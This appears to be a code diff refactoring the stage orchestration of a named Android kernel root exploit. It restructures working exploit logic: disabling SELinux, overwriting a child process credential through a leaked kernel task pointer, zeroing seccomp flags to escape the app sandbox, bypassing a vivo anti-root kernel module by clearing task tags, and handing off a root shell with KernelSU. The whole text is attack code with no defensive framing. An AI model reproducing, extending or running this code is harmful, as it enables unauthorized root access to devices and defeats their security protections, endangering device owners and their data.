@@ -1332,6 +1332,21 @@ static int verify_leaf_dir_stage(void *context) {
     return 0;
 }
 
+/* Outcome of one orchestration stage. Failed maps to exit code 1, Continue
+ * proceeds to the next stage and Done stops with exit code 0 (diagnostics). */
+enum class StageResult {
+    Failed,
+    Continue,
+    Done,
+};
+
+/* Outcome of one W2/W3 victim round. */
+enum class VictimRound {
+    Failed,
+    Retry,
+    Rooted,
+};
+
 /* State handed from the W2/W3 victim chain to the late-load stage. */
 struct VictimChain {
     pid_t child = -1;
@@ -1340,13 +1355,12 @@ struct VictimChain {
     int ever_rooted = 0;
 };
 
-/* Stage split: process setup and profile selection. Returns 0 on success and 1
- * when the caller must exit with code 1. */
-static int run_setup_stage(const char *profile_path) {
+/* Stage split: process setup and profile selection. */
+static StageResult run_setup_stage(const char *profile_path) {
     heap_context_init(&g_heap_context);
     if (!profile_path) {
         pr_error("missing required --profile <resolved-profile.json>\n");
-        return 1;
+        return StageResult::Failed;
     }
     disable_rseq_for_thread();
     set_unbuffer();
@@ -1355,13 +1369,13 @@ static int run_setup_stage(const char *profile_path) {
     reserve_standard_io();
     if (runtime_config_init(&runtime_config_snapshot()) != 0) {
         pr_error("runtime configuration failed errno=%d\n", errno);
-        return 1;
+        return StageResult::Failed;
     }
     write_root_script();
 
     if (!target_profile_is_loaded(&g_target_profile) &&
             select_offsets(profile_path) < 0)
-        return 1;
+        return StageResult::Failed;
 
     apply_iomem_cache();
     log_startup_context();
@@ -1371,13 +1385,12 @@ static int run_setup_stage(const char *profile_path) {
 
     timer_reset();
     TIMER("exploit start");
-    return 0;
+    return StageResult::Continue;
 }
 
 /* Stage split: W1 SELinux plus the one-shot scratch repair / resident policycap
- * repair. Returns 0 on failure (caller exits 1), 1 to continue and 2 when the
- * w1-only diagnostic already finished (caller exits 0). */
-static int run_w1_stage(ghostlock::ExploitSession &session) {
+ * repair. */
+static StageResult run_w1_stage(ghostlock::ExploitSession &session) {
     /* W1: disable SELinux before task discovery. untrusted_app may not be able
      * to read enforce while it is still enforcing, so attempt W1 regardless. */
     int selinux_ok = check_selinux_off();
@@ -1400,7 +1413,7 @@ static int run_w1_stage(ghostlock::ExploitSession &session) {
         if (!selinux_ok) {
             pr_warning("Write 1 failed\n");
             kernel5_resident_stop();
-            return 0;
+            return StageResult::Failed;
         }
         if (kernel5_route_selected() &&
                 !runtime_config_snapshot().multicast_resident_enabled) {
@@ -1408,7 +1421,7 @@ static int run_w1_stage(ghostlock::ExploitSession &session) {
                     (g_heap_context.current.base) + PROFILE_VALUES->mcast_buffer_size;
             if (!quarantine_reclaim_sockets()) {
                 pr_warning("W1 scratch page quarantine failed\n");
-                return 0;
+                return StageResult::Failed;
             }
             int repaired = 0;
             int repair_attempts =
@@ -1429,7 +1442,7 @@ static int run_w1_stage(ghostlock::ExploitSession &session) {
                 release_quarantined_reclaim_sockets();
             } else {
                 pr_warning("private scratch repair failed; keeping page quarantined\n");
-                return 0;
+                return StageResult::Failed;
             }
         }
         if (kernel5_route_selected() &&
@@ -1446,246 +1459,268 @@ static int run_w1_stage(ghostlock::ExploitSession &session) {
                     repair)) {
                 pr_warning("W1 policycap repair failed\n");
                 kernel5_resident_stop();
-                return 0;
+                return StageResult::Failed;
             }
         }
         TIMER("Write 1 complete");
         if (runtime_config_snapshot().w1_only) {
             pr_success("W1-only diagnostic complete\n");
-            return 2;
+            return StageResult::Done;
         }
     } else {
         pr_success("SELinux already permissive\n");
     }
-    return 1;
+    return StageResult::Continue;
 }
 
-/* Stage split: the W2/W3 victim chain. Returns 0 on failure (caller exits 1)
- * and 1 to continue to the late-load stage. */
-static int run_w2_w3_chain(ghostlock::ExploitSession &session,
+/* W3 chain retry: park the previous rooted child on its command pipe so the
+ * late-load stage can still start a root shell from it. */
+static void park_rooted_child(ghostlock::ExploitSession &session,
+        struct VictimChain &chain, int round, int chain_rounds) {
+    ghostlock::VictimContext &pipes = session.victim;
+    pr_warning("W3 chain retry %d/%d: parking rooted child\n",
+            round, chain_rounds);
+    if (chain.child > 0 && chain.child_alive) {
+        write(pipes.cmd_write.get(), "P", 1);
+        usleep(50000);
+        session.parked_victim = chain.child;
+        session.parked_victim_cmd = std::move(pipes.cmd_write);
+    } else {
+        pipes.cmd_write.reset();
+    }
+    pipes.uid_read.reset();
+    chain.child_alive = 1;
+    chain.seccomp_ok = 0;
+}
+
+/* Spawn one victim, clear the vivo tag (when built) and write the credential.
+ * Retry means the perf leak missed and the chain should respawn. */
+static VictimRound root_victim(ghostlock::ExploitSession &session,
+        struct VictimChain &chain, struct w2_stage_context *w2_context,
+        uintptr_t *child_task) {
+    ghostlock::VictimContext &pipes = session.victim;
+    pid_t &child = chain.child;
+    int &child_alive = chain.child_alive;
+
+    child = spawn_victim(&pipes, child_task);
+    if (child < 0) {
+        pr_warning("fork failed\n");
+        return VictimRound::Failed;
+    }
+    TIMER("perf_find_task done");
+
+    if (!*child_task) {
+        /* nothing rooted yet; safe to kill and burn a round */
+        pr_warning("perf leak did not reproduce; retrying next round\n");
+        kill(-child, SIGKILL);
+        waitpid(child, NULL, 0);
+
+        child_alive = 0;
+        pipes.cmd_write.reset();
+        pipes.uid_read.reset();
+        return VictimRound::Retry;
+    }
+
+    pr_info("child_pid=%d child_task=0x%016zx\n", child, *child_task);
+#ifdef VR_TAG_A_OFF
+    /* ------------------------------------------------------------------
+     * vivo vr.ko anti-root per-task bypass (ported from root.c)
+     * ------------------------------------------------------------------
+     * vr.ko tags every app-origin task at fork/clone time. When the task
+     * later holds euid 0, the sys_exit tracepoint probe kills it. We must
+     * strip the tag BEFORE W2 verify runs the child's getuid().
+     *
+     * This exploit primitive is 64-bit granular, so:
+     *   – task+0x00 (thread_info.flags) covers tag A at +0x06 and also
+     *     clears the VR_SYSCALL_TP_FLAG bit (0x400). This takes the task
+     *     off the sys_exit slow-path immediately.
+     *   – tag B is at +0x2c. We align down to 8 bytes (0x28) and zero the
+     *     whole word. VERIFY ON-DEVICE that zeroing bytes 0x28-0x2f is
+     *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
+     * ------------------------------------------------------------------ */
+    {
+        static int vr_needed = -1;
+        if (vr_needed < 0) {
+            vr_needed = 1; /* /proc/modules unreadable: assume loaded */
+            FILE *m = fopen("/proc/modules", "r");
+            if (m) {
+                char mod[256];
+                vr_needed = 0;
+                while (fgets(mod, sizeof(mod), m))
+                    if (!strncasecmp(mod, "vr", 2) && (mod[2] == ' ' || mod[2] == '_')) {
+                        vr_needed = 1;
+                        break;
+                    }
+                fclose(m);
+            }
+            pr_info("vr.ko %s\n", vr_needed ? "loaded; clearing tags"
+                    : "not loaded; skipping tag clear");
+        }
+
+        int vr_ok = 1;
+        if (vr_needed) {
+            /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
+            const WriteRequest flags_request = WriteRequest::make(
+                    *child_task + TASK_THREAD_INFO_FLAGS_OFF, WriteMode::Zero, 1);
+            vr_ok &= do_one_write(&flags_request, "VR: flags+tagA");
+
+            /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
+            if (vr_ok) {
+                uintptr_t tagb_align = (*child_task + VR_TAG_B_OFF) & ~7ULL;
+                const WriteRequest tagb_request =
+                        WriteRequest::make(tagb_align, WriteMode::Zero, 1);
+                vr_ok &= do_one_write(&tagb_request, "VR: tagB");
+            }
+
+            if (vr_ok) {
+                pr_success("VR.ko per-task tags cleared\n");
+            } else {
+                pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
+            }
+        }
+    }
+#endif
+
+    int got_root = retry_write_stage(
+            session,
+            "W2: cred", *child_task + TASK_CRED_OFF, 2,
+            (int) execution_settings()->w2_attempts,
+            execution_settings()->w2_settle_us,
+            verify_w2_stage, w2_context, 0);
+    if (!got_root) {
+        write(pipes.cmd_write.get(), "X", 1);
+        pipes.cmd_write.reset();
+        pipes.uid_read.reset();
+        pr_warning("W2 failed after %u rounds\n",
+                execution_settings()->w2_attempts);
+        waitpid(child, NULL, WNOHANG);
+        return VictimRound::Failed;
+    }
+    chain.ever_rooted = 1;
+    /* rooted children never exit; chain failures park (P) */
+    return VictimRound::Rooted;
+}
+
+/* Clear TIF_SECCOMP and seccomp.mode on the rooted child. Returns true when the
+ * child probe reports a filter-free fork. */
+static bool clear_victim_seccomp(ghostlock::ExploitSession &session,
+        struct VictimChain &chain, struct w2_stage_context *w2_context,
+        uintptr_t child_task) {
+    ghostlock::VictimContext &pipes = session.victim;
+    pid_t &child = chain.child;
+    int &child_alive = chain.child_alive;
+    int &seccomp_ok = chain.seccomp_ok;
+
+    /* W3: clear the child's seccomp filter for the independent root shell
+     * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
+     * must be zeroed too; do both writes back-to-back with one probe
+     * (real finit_module calls trip vendor root guards).
+     * tcp stamps *(target) exactly, so aim straight at thread_info.flags
+     * (task+0) / seccomp.mode; only the pselect fallback needs the comm
+     * probe to tell [target] from [target+8]. */
+    if (!process_has_seccomp()) {
+        pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
+        seccomp_ok = 1;
+        return true;
+    }
+
+    int tcp_writes = tcp_route_selected();
+    struct w3_stage_context w3_context = {
+            .pipes = &pipes,
+            .leaf_to_target8 = !tcp_writes,
+    };
+    if (!tcp_writes) {
+        int dir_ok = retry_write_stage(
+                session,
+                "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
+                verify_leaf_dir_stage, &w3_context, 1);
+        if (!dir_ok) {
+            pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
+        }
+    }
+
+    uintptr_t flags_target = w3_context.leaf_to_target8
+            ? child_task - 8
+            : child_task + TASK_THREAD_INFO_FLAGS_OFF;
+    uintptr_t mode_target = w3_context.leaf_to_target8
+            ? child_task + TASK_SECCOMP_OFF - 8
+            : child_task + TASK_SECCOMP_OFF;
+
+    int w3_attempts = (int) execution_settings()->w3_attempts;
+    for (int attempt = 1; attempt <= w3_attempts; attempt++) {
+        pr_info("W3: TIF_SECCOMP+mode attempt %d/%d\n", attempt, w3_attempts);
+        if (attempt == 1) slab_drain();
+        const WriteRequest flags_request =
+                WriteRequest::make(flags_target, WriteMode::Zero, 1);
+        int routed = do_one_write(&flags_request, "W3: TIF_SECCOMP");
+        if (!routed) {
+            pr_warning("W3 attempt %d route failed; backing off\n", attempt);
+            usleep(100000);
+            continue;
+        }
+        usleep(execution_settings()->w3_settle_us);
+        const WriteRequest mode_request =
+                WriteRequest::make(mode_target, WriteMode::Zero, 1);
+        routed = do_one_write(&mode_request, "W3: seccomp mode");
+        if (!routed) {
+            pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
+            usleep(100000);
+            continue;
+        }
+        usleep(execution_settings()->w3_settle_us);
+        int st = 0;
+        if (waitpid(child, &st, WNOHANG) == child) {
+            pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
+            child_alive = 0;
+            break;
+        }
+        if (verify_seccomp_probe_stage(w2_context)) {
+            seccomp_ok = 1;
+            break;
+        }
+        usleep(execution_settings()->w3_settle_us);
+    }
+
+    if (!seccomp_ok) {
+        pr_warning("W3 seccomp clear failed; ksud late-load will likely stay blocked\n");
+        return false;
+    }
+    pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
+    return true;
+}
+
+/* Stage split: the W2/W3 victim chain. */
+static StageResult run_w2_w3_chain(ghostlock::ExploitSession &session,
         struct VictimChain *chain) {
     /* W2: overwrite the child credential via the task leaked by perf. */
     slab_drain();
     TIMER("pre-W2 drain");
 
-    /* SESSION-02: the victim protocol pipes are owned by the session; this
-     * reference keeps the W2/W3 stage code unchanged. */
-    ghostlock::VictimContext &pipes = session.victim;
-    struct w2_stage_context w2_context = {.pipes = &pipes};
-    pid_t &child = chain->child;
-    uintptr_t child_task = 0;
-    int &child_alive = chain->child_alive;
-    int &seccomp_ok = chain->seccomp_ok;
-    int &ever_rooted = chain->ever_rooted;
-    /* SESSION-02: parked handoff state is owned by the session. */
-    pid_t &parked_child = session.parked_victim;
-    ghostlock::UniqueFd &parked_cmd_w = session.parked_victim_cmd;
+    struct w2_stage_context w2_context = {.pipes = &session.victim};
 
     /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
      * child, so respawn and redo. */
     int chain_rounds = (int) execution_settings()->w3_chain_rounds;
     for (int round = 1; round <= chain_rounds; round++) {
-        if (round > 1) {
-            pr_warning("W3 chain retry %d/%d: parking rooted child\n",
-                    round, chain_rounds);
-            if (child > 0 && child_alive) {
-                write(pipes.cmd_write.get(), "P", 1);
-                usleep(50000);
-                parked_child = child;
-                parked_cmd_w = std::move(pipes.cmd_write);
-            } else {
-                pipes.cmd_write.reset();
-            }
-            pipes.uid_read.reset();
-            child_alive = 1;
-            seccomp_ok = 0;
-        }
+        if (round > 1) park_rooted_child(session, *chain, round, chain_rounds);
 
-        child = spawn_victim(&pipes, &child_task);
-        if (child < 0) {
-            pr_warning("fork failed\n");
-            return 0;
-        }
-        TIMER("perf_find_task done");
-
-        if (!child_task) {
-            /* nothing rooted yet; safe to kill and burn a round */
-            pr_warning("perf leak did not reproduce; retrying next round\n");
-            kill(-child, SIGKILL);
-            waitpid(child, NULL, 0);
-
-            child_alive = 0;
-            pipes.cmd_write.reset();
-            pipes.uid_read.reset();
-            continue;
-
-        }
-
-        pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
-#ifdef VR_TAG_A_OFF
-        /* ------------------------------------------------------------------
-         * vivo vr.ko anti-root per-task bypass (ported from root.c)
-         * ------------------------------------------------------------------
-         * vr.ko tags every app-origin task at fork/clone time. When the task
-         * later holds euid 0, the sys_exit tracepoint probe kills it. We must
-         * strip the tag BEFORE W2 verify runs the child's getuid().
-         *
-         * This exploit primitive is 64-bit granular, so:
-         *   – task+0x00 (thread_info.flags) covers tag A at +0x06 and also
-         *     clears the VR_SYSCALL_TP_FLAG bit (0x400). This takes the task
-         *     off the sys_exit slow-path immediately.
-         *   – tag B is at +0x2c. We align down to 8 bytes (0x28) and zero the
-         *     whole word. VERIFY ON-DEVICE that zeroing bytes 0x28-0x2f is
-         *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
-         * ------------------------------------------------------------------ */
-        {
-            static int vr_needed = -1;
-            if (vr_needed < 0) {
-                vr_needed = 1; /* /proc/modules unreadable: assume loaded */
-                FILE *m = fopen("/proc/modules", "r");
-                if (m) {
-                    char mod[256];
-                    vr_needed = 0;
-                    while (fgets(mod, sizeof(mod), m))
-                        if (!strncasecmp(mod, "vr", 2) && (mod[2] == ' ' || mod[2] == '_')) {
-                            vr_needed = 1;
-                            break;
-                        }
-                    fclose(m);
-                }
-                pr_info("vr.ko %s\n", vr_needed ? "loaded; clearing tags"
-                        : "not loaded; skipping tag clear");
-            }
-
-            int vr_ok = 1;
-            if (vr_needed) {
-                /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
-                const WriteRequest flags_request = WriteRequest::make(
-                        child_task + TASK_THREAD_INFO_FLAGS_OFF, WriteMode::Zero, 1);
-                vr_ok &= do_one_write(&flags_request, "VR: flags+tagA");
-
-                /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
-                if (vr_ok) {
-                    uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
-                    const WriteRequest tagb_request =
-                            WriteRequest::make(tagb_align, WriteMode::Zero, 1);
-                    vr_ok &= do_one_write(&tagb_request, "VR: tagB");
-                }
-
-                if (vr_ok) {
-                    pr_success("VR.ko per-task tags cleared\n");
-                } else {
-                    pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
-                }
-            }
-        }
-#endif
-
-        int got_root = retry_write_stage(
-                session,
-                "W2: cred", child_task + TASK_CRED_OFF, 2,
-                (int) execution_settings()->w2_attempts,
-                execution_settings()->w2_settle_us,
-                verify_w2_stage, &w2_context, 0);
-        if (!got_root) {
-            write(pipes.cmd_write.get(), "X", 1);
-            pipes.cmd_write.reset();
-            pipes.uid_read.reset();
-            pr_warning("W2 failed after %u rounds\n",
-                    execution_settings()->w2_attempts);
-            waitpid(child, NULL, WNOHANG);
-            return 0;
-        }
-        ever_rooted = 1;
-        /* rooted children never exit; chain failures park (P) */
-
-        /* W3: clear the child's seccomp filter for the independent root shell
-         * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
-         * must be zeroed too; do both writes back-to-back with one probe
-         * (real finit_module calls trip vendor root guards).
-         * tcp stamps *(target) exactly, so aim straight at thread_info.flags
-         * (task+0) / seccomp.mode; only the pselect fallback needs the comm
-         * probe to tell [target] from [target+8]. */
-        if (!process_has_seccomp()) {
-            pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
-            seccomp_ok = 1;
+        uintptr_t child_task = 0;
+        const VictimRound rooted =
+                root_victim(session, *chain, &w2_context, &child_task);
+        if (rooted == VictimRound::Failed) return StageResult::Failed;
+        if (rooted == VictimRound::Retry) continue;
+        if (clear_victim_seccomp(session, *chain, &w2_context, child_task))
             break;
-        }
-
-        int tcp_writes = tcp_route_selected();
-        struct w3_stage_context w3_context = {
-                .pipes = &pipes,
-                .leaf_to_target8 = !tcp_writes,
-        };
-        if (!tcp_writes) {
-            int dir_ok = retry_write_stage(
-                    session,
-                    "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
-                    verify_leaf_dir_stage, &w3_context, 1);
-            if (!dir_ok) {
-                pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
-            }
-        }
-
-        uintptr_t flags_target = w3_context.leaf_to_target8
-                ? child_task - 8
-                : child_task + TASK_THREAD_INFO_FLAGS_OFF;
-        uintptr_t mode_target = w3_context.leaf_to_target8
-                ? child_task + TASK_SECCOMP_OFF - 8
-                : child_task + TASK_SECCOMP_OFF;
-
-        int w3_attempts = (int) execution_settings()->w3_attempts;
-        for (int attempt = 1; attempt <= w3_attempts; attempt++) {
-            pr_info("W3: TIF_SECCOMP+mode attempt %d/%d\n", attempt, w3_attempts);
-            if (attempt == 1) slab_drain();
-            const WriteRequest flags_request =
-                    WriteRequest::make(flags_target, WriteMode::Zero, 1);
-            int routed = do_one_write(&flags_request, "W3: TIF_SECCOMP");
-            if (!routed) {
-                pr_warning("W3 attempt %d route failed; backing off\n", attempt);
-                usleep(100000);
-                continue;
-            }
-            usleep(execution_settings()->w3_settle_us);
-            const WriteRequest mode_request =
-                    WriteRequest::make(mode_target, WriteMode::Zero, 1);
-            routed = do_one_write(&mode_request, "W3: seccomp mode");
-            if (!routed) {
-                pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
-                usleep(100000);
-                continue;
-            }
-            usleep(execution_settings()->w3_settle_us);
-            int st = 0;
-            if (waitpid(child, &st, WNOHANG) == child) {
-                pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
-                child_alive = 0;
-                break;
-            }
-            if (verify_seccomp_probe_stage(&w2_context)) {
-                seccomp_ok = 1;
-                break;
-            }
-            usleep(execution_settings()->w3_settle_us);
-        }
-
-        if (!seccomp_ok) {
-            pr_warning("W3 seccomp clear failed; ksud late-load will likely stay blocked\n");
-            continue; /* respawn and redo the chain */
-        }
-        pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
-        break;
     }
 
-    if (!seccomp_ok)
+    if (!chain->seccomp_ok)
         pr_warning("W3 seccomp bypass failed after %d chain rounds; ksud late-load will likely stay blocked\n",
                 chain_rounds);
-    return 1;
+    return StageResult::Continue;
 }
 
-/* Stage split: settle, root-shell handoff and KernelSU late-load. Returns the
- * process exit code. */
-static int run_handoff_stage(ghostlock::ExploitSession &session,
+/* Stage split: settle, root-shell handoff and KernelSU late-load. */
+static StageResult run_handoff_stage(ghostlock::ExploitSession &session,
         const struct VictimChain &chain) {
     const pid_t child = chain.child;
     const int child_alive = chain.child_alive;
@@ -1705,7 +1740,7 @@ static int run_handoff_stage(ghostlock::ExploitSession &session,
     TIMER("exploit complete");
     if (!ever_rooted) {
         pr_error("w2 never rooted a child\n");
-        return 1;
+        return StageResult::Failed;
     }
     if (child_alive) {
         errno = 0;
@@ -1755,7 +1790,7 @@ static int run_handoff_stage(ghostlock::ExploitSession &session,
     else
         pr_warning("temporary root ready; KernelSU module not loaded (W3 seccomp clear failed)\n");
     kernel5_resident_stop();
-    return 0;
+    return StageResult::Done;
 }
 
 /* Decoupling plan: top-level lifecycle and W1/W2/W3 orchestration. Inputs:
@@ -1763,7 +1798,7 @@ static int run_handoff_stage(ghostlock::ExploitSession &session,
  * exploit_session_run(ExploitSession *), delegating profile, heap, race, route,
  * victim and cleanup responsibilities to their contexts. */
 int run_exploit(ghostlock::ExploitSession &session, const char *profile_path) {
-    if (run_setup_stage(profile_path) != 0) return 1;
+    if (run_setup_stage(profile_path) == StageResult::Failed) return 1;
 
     if (runtime_config_snapshot().multicast_phase1_probe) {
         if (!kernel5_route_selected()) {
@@ -1777,14 +1812,18 @@ int run_exploit(ghostlock::ExploitSession &session, const char *profile_path) {
         return ok ? 0 : 1;
     }
 
-    const int w1 = run_w1_stage(session);
-    if (w1 == 0) return 1;
-    if (w1 == 2) return 0;
+    switch (run_w1_stage(session)) {
+        case StageResult::Failed:
+            return 1;
+        case StageResult::Done:
+            return 0;
+        case StageResult::Continue:
+            break;
+    }
 
     VictimChain chain;
-    if (run_w2_w3_chain(session, &chain) == 0) return 1;
-
-    return run_handoff_stage(session, chain);
+    if (run_w2_w3_chain(session, &chain) == StageResult::Failed) return 1;
+    return run_handoff_stage(session, chain) == StageResult::Failed ? 1 : 0;
 }
 
 /* Decoupling plan: native executable adapter. Inputs: argc/argv; output: stable
